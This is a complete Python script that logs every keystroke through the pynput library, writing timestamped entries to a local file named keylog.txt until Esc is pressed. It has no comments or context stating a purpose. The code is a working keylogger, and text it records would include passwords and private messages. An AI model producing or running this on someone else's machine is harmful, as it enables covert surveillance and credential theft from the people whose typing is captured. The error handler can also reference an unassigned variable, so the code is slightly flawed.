from pynput import keyboard
import datetime

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            key_str = str(key).replace("'", "")
            if key == keyboard.Key.space:
                key_str = "SPACE"
            elif key == keyboard.Key.enter:
                key_str = "ENTER"
            elif key == keyboard.Key.tab:
                key_str = "TAB"
            elif key == keyboard.Key.backspace:
                key_str = "BACKSPACE"
            elif key == keyboard.Key.esc:
                key_str = "ESC"
                f.write(f"[{timestamp}] {key_str}\n")
                return False  # Stop listener
            f.write(f"[{timestamp}] {key_str}\n")
    except Exception as e:
        with open(log_file, "a") as f:
            f.write(f"[{timestamp}] Error: {str(e)}\n")

def main():
    with open(log_file, "a") as f:
        f.write(f"\n--- Keylog started at {datetime.datetime.now()} ---\n")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

if __name__ == "__main__":
    main()